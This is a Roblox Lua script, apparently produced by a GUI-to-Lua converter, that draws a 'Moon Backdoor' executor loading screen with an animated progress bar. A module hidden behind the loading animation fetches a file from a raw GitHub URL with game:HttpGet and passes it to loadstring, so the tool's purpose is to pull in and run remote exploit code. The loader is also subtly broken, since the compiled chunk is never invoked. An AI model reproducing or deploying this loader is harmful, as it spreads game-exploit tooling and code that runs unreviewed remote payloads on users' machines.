--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 15 | Scripts: 1 | Modules: 1 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.OK
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(58, 60, 62);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(0, 402, 0, 244);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2"]["Name"] = [[OK]];


-- StarterGui.ScreenGui.OK.Element
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(239, 248, 255);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Size"] = UDim2.new(0, 402, 0, 244);
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3"]["Name"] = [[Element]];
G2L["3"]["BackgroundTransparency"] = 0.95;


-- StarterGui.ScreenGui.OK.Element.UIGradient
G2L["4"] = Instance.new("UIGradient", G2L["3"]);
G2L["4"]["Rotation"] = -136;
G2L["4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.414, 0),NumberSequenceKeypoint.new(0.422, 1),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.OK.Element.Say
G2L["5"] = Instance.new("TextLabel", G2L["3"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 25;
G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5"]["TextTransparency"] = 0.7;
G2L["5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Size"] = UDim2.new(-0.1, 200, -0.04, 50);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Best and Fastest Backdoor Exe]];
G2L["5"]["Name"] = [[Say]];
G2L["5"]["Position"] = UDim2.new(0.07229, 0, 0.2159, 0);


-- StarterGui.ScreenGui.OK.Element.Bar1
G2L["6"] = Instance.new("Frame", G2L["3"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(0, 238, 0, 8);
G2L["6"]["Position"] = UDim2.new(0.0398, 0, 0.90574, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[Bar1]];
G2L["6"]["BackgroundTransparency"] = 0.8;


-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2
G2L["7"] = Instance.new("Frame", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["Size"] = UDim2.new(0, 0, 0, 8);
G2L["7"]["Position"] = UDim2.new(0, 0, 0.5, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[Bar2]];
G2L["7"]["BackgroundTransparency"] = 0.8;


-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2.LocalScript.Require
G2L["9"] = Instance.new("ModuleScript", G2L["8"]);
G2L["9"]["Name"] = [[Require]];


-- StarterGui.ScreenGui.OK.Element.Bar1.UIListLayout
G2L["a"] = Instance.new("UIListLayout", G2L["6"]);
G2L["a"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.OK.Element.Creator
G2L["b"] = Instance.new("TextLabel", G2L["3"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 18;
G2L["b"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["b"]["TextTransparency"] = 0.7;
G2L["b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(-0.18706, 200, -0.11098, 50);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Developed by MoonVM]];
G2L["b"]["Name"] = [[Creator]];
G2L["b"]["Position"] = UDim2.new(0.66393, 0, 0.86574, 0);


-- StarterGui.ScreenGui.OK.Element.ASL
G2L["c"] = Instance.new("TextLabel", G2L["3"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 39;
G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c"]["TextTransparency"] = 0.7;
G2L["c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Size"] = UDim2.new(-0.1, 200, -0.04, 50);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[Moon Backdoor]];
G2L["c"]["Name"] = [[ASL]];
G2L["c"]["Position"] = UDim2.new(0.06229, 0, 0.0759, 0);


-- StarterGui.ScreenGui.Ops
G2L["d"] = Instance.new("Frame", G2L["1"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["Size"] = UDim2.new(0.99182, 1, 0.97679, 1);
G2L["d"]["Position"] = UDim2.new(0.00818, 0, 0, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[Ops]];
G2L["d"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Ops.UIListLayout
G2L["e"] = Instance.new("UIListLayout", G2L["d"]);
G2L["e"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Ops.ASL
G2L["f"] = Instance.new("TextLabel", G2L["d"]);
G2L["f"]["TextWrapped"] = true;
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 39;
G2L["f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["f"]["TextTransparency"] = 1;
G2L["f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["TextScaled"] = true;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Size"] = UDim2.new(-0.08435, 200, -0.06056, 50);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[Moon Backdoor]];
G2L["f"]["Name"] = [[ASL]];
G2L["f"]["Position"] = UDim2.new(0, 0, 0.98149, 0);


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["9"]] = {
Closure = function()
    local script = G2L["9"];local M = {}

function M.require()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/G4mg1/newone/refs/heads/main/README.md"))
end

return M
end;
};
-- StarterGui.ScreenGui.OK.Element.Bar1.Bar2.LocalScript
local function C_8()
local script = G2L["8"];
	local bar2 = script.Parent
	local Model = require(script.Require)
	
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end
	
	wait(2)
	
	bar2:TweenSize(
		UDim2.new(0, 238, 0, 8),
		Enum.EasingDirection.Out,
		Enum.EasingStyle.Quad,
		0.5,
		true
	)
	
	wait(1)
	Model.require()
	script.Parent.Parent.Parent.Parent:TweenPosition(UDim2.new(0.5, 0,1.47, 0))
	
	for i = 1, 0.7, -0.1 do
		script.Parent.Parent.Parent.Parent.Parent.Ops.ASL.TextTransparency = i
		wait(0.05)
		
		script.Parent.Parent.Parent.Parent.Parent.Ops.ASL:TweenSize(UDim2.new(0, 200,-0.016, 50))
	end
	
	
	
end;
task.spawn(C_8);

return G2L["1"], require;
